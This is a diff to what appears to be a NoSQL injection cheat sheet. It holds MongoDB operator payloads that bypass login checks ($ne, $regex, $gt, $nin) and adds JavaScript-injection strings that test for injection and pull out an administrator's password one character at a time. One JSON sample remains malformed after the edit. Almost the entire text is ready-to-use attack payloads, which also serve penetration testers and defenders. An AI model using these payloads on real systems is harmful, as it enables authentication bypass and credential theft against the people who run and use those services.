@@ -11,12 +11,20 @@ username[$ne]=toto&password[$ne]=toto
 login[$regex]=a.*&pass[$ne]=lol
 login[$gt]=admin&login[$lt]=test&pass[$ne]=1
 login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+# For testing
+'
+'+'
+'%2b'
+' && '1' == '2 ---> url-encoded
+' && '1' == '1 ---> url-encoded
+administrator' && this.password.length > 7 || 'a'=='b  ---> url-encoded
+administrator' && this.password[0] == 'k' || 'a'=='b ---> url-encoded
 ```
 
 in JSON:
 ```json
 {"username": {"$ne": null}, "password": {"$ne": null}}
-{"username": {""$ne": "bar"}}
+{"username": {$ne": "bar"}}
 {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
 {"username": {"$gt":""}, "password": {"$gt":""}}
 ```
